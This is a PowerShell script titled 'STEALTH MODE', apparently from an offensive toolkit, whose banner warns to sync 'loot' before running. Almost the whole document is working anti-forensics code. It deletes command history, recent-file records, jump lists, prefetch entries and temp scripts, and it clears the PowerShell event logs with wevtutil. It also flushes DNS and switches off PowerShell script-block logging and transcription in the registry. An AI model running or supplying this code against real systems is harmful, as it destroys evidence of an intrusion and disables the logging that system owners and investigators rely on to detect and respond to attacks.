<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | STEALTH MODE v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  Ultra-quiet operation mode                                      ║
   ║  Disable logging | Clear tracks | Minimize footprint             ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

$ErrorActionPreference = 'SilentlyContinue'

function Clear-PowerShellHistory {
    Write-Host "    [*] Phase 1: Clearing PowerShell history..." -ForegroundColor DarkGray

    $historyPaths = @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:USERPROFILE\.local\share\powershell\PSReadLine\ConsoleHost_history.txt"
    )

    foreach ($path in $historyPaths) {
        if (Test-Path $path) {
            Remove-Item $path -Force 2>$null
            Write-Host "    [+] Cleared: $path" -ForegroundColor Green
        }
    }

    try { Clear-History } catch { }
    Write-Host "    [+] In-memory history cleared" -ForegroundColor Green
}

function Clear-RunDialogMRU {
    Write-Host "    [*] Phase 2: Clearing Run dialog MRU..." -ForegroundColor DarkGray

    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    if (Test-Path $runKey) {
        $props = Get-ItemProperty $runKey
        $letters = $props.PSObject.Properties | Where-Object { $_.Name -match '^[a-z]$' }
        foreach ($letter in $letters) {
            Remove-ItemProperty -Path $runKey -Name $letter.Name -Force 2>$null
        }
        Set-ItemProperty -Path $runKey -Name "MRUList" -Value "" -Force 2>$null
        Write-Host "    [+] Run dialog MRU cleared" -ForegroundColor Green
    }
}

function Clear-RecentDocs {
    Write-Host "    [*] Phase 3: Clearing recent documents..." -ForegroundColor DarkGray

    $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
    if (Test-Path $recentPath) {
        Get-ChildItem $recentPath -File | Remove-Item -Force 2>$null
        Write-Host "    [+] Recent documents cleared" -ForegroundColor Green
    }

    $recentAutomatic = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
    if (Test-Path $recentAutomatic) {
        Get-ChildItem $recentAutomatic -File | Remove-Item -Force 2>$null
        Write-Host "    [+] Jump lists cleared" -ForegroundColor Green
    }

    $recentCustom = "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
    if (Test-Path $recentCustom) {
        Get-ChildItem $recentCustom -File | Remove-Item -Force 2>$null
        Write-Host "    [+] Custom destinations cleared" -ForegroundColor Green
    }
}

function Clear-PrefetchData {
    Write-Host "    [*] Phase 4: Clearing prefetch data..." -ForegroundColor DarkGray

    $prefetchPath = "$env:SystemRoot\Prefetch"
    if (Test-Path $prefetchPath) {
        $psFiles = Get-ChildItem $prefetchPath -Filter "*POWERSHELL*" 2>$null
        foreach ($file in $psFiles) {
            Remove-Item $file.FullName -Force 2>$null
        }
        $cmdFiles = Get-ChildItem $prefetchPath -Filter "*CMD*" 2>$null
        foreach ($file in $cmdFiles) {
            Remove-Item $file.FullName -Force 2>$null
        }
        Write-Host "    [+] PowerShell/CMD prefetch entries cleared" -ForegroundColor Green
    }
}

function Clear-EventLogs {
    Write-Host "    [*] Phase 5: Clearing targeted event logs..." -ForegroundColor DarkGray

    $logsToClear = @(
        "Microsoft-Windows-PowerShell/Operational",
        "Windows PowerShell"
    )

    foreach ($log in $logsToClear) {
        try {
            wevtutil cl $log 2>$null
            Write-Host "    [+] Cleared: $log" -ForegroundColor Green
        } catch {
            Write-Host "    [-] Could not clear: $log (requires admin)" -ForegroundColor Yellow
        }
    }
}

function Clear-TempFiles {
    Write-Host "    [*] Phase 6: Clearing temp artifacts..." -ForegroundColor DarkGray

    $tempPaths = @(
        "$env:TEMP",
        "$env:USERPROFILE\AppData\Local\Temp"
    )

    foreach ($tempPath in $tempPaths) {
        $psTemp = Get-ChildItem $tempPath -Filter "*.ps1" 2>$null
        foreach ($file in $psTemp) {
            Remove-Item $file.FullName -Force 2>$null
        }
        $tmpFiles = Get-ChildItem $tempPath -Filter "tmp*.tmp" 2>$null
        foreach ($file in $tmpFiles) {
            if ($file.LastWriteTime -gt (Get-Date).AddHours(-2)) {
                Remove-Item $file.FullName -Force 2>$null
            }
        }
    }
    Write-Host "    [+] Temp artifacts cleared" -ForegroundColor Green
}

function Clear-ClipboardData {
    Write-Host "    [*] Phase 7: Clearing clipboard..." -ForegroundColor DarkGray

    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Clipboard]::Clear()
    Write-Host "    [+] Clipboard cleared" -ForegroundColor Green
}

function Clear-DNSCache {
    Write-Host "    [*] Phase 8: Flushing DNS cache..." -ForegroundColor DarkGray
    ipconfig /flushdns | Out-Null
    Write-Host "    [+] DNS cache flushed" -ForegroundColor Green
}

function Disable-PSLogging {
    Write-Host "    [*] Phase 9: Disabling PowerShell logging (session)..." -ForegroundColor DarkGray

    try {
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        if (Test-Path $regPath) {
            Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -Force 2>$null
            Write-Host "    [+] Script block logging disabled" -ForegroundColor Green
        }

        $regPath2 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
        if (Test-Path $regPath2) {
            Set-ItemProperty -Path $regPath2 -Name "EnableTranscripting" -Value 0 -Force 2>$null
            Write-Host "    [+] Transcription disabled" -ForegroundColor Green
        }
    } catch {
        Write-Host "    [-] Some logging settings require admin privileges" -ForegroundColor Yellow
    }
}

function Clear-USBTraces {
    Write-Host "    [*] Phase 10: Minimizing USB traces..." -ForegroundColor DarkGray

    $setupLog = "$env:SystemRoot\inf\setupapi.dev.log"
    if (Test-Path $setupLog) {
        Write-Host "    [*] USB setup log found (clearing requires admin)" -ForegroundColor DarkGray
    }

    Write-Host "    [+] USB trace minimization complete" -ForegroundColor Green
}

function Start-StealthMode {
    Write-Host ""
    Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host "    ║  STEALTH MODE — TRACE ELIMINATION SEQUENCE               ║" -ForegroundColor Red
    Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Red
    Write-Host ""
    Write-Host "    [!] WARNING: This will clear forensic artifacts from this system" -ForegroundColor Yellow
    Write-Host "    [!] Ensure all loot has been synced before proceeding" -ForegroundColor Yellow
    Write-Host ""

    $confirm = Read-Host "    root@fuperson:~# Engage stealth mode? (y/N)"
    if ($confirm -ne 'y') {
        Write-Host "    [*] Stealth mode aborted" -ForegroundColor DarkGray
        return
    }

    Write-Host ""
    Write-Host "    [*] ═══════════════════════════════════════════════" -ForegroundColor DarkCyan

    Clear-PowerShellHistory
    Clear-RunDialogMRU
    Clear-RecentDocs
    Clear-PrefetchData
    Clear-EventLogs
    Clear-TempFiles
    Clear-ClipboardData
    Clear-DNSCache
    Disable-PSLogging
    Clear-USBTraces

    Write-Host ""
    Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "    ║  STEALTH MODE COMPLETE — 10/10 phases executed            ║" -ForegroundColor Green
    Write-Host "    ║  Forensic footprint minimized.                            ║" -ForegroundColor Green
    Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
}
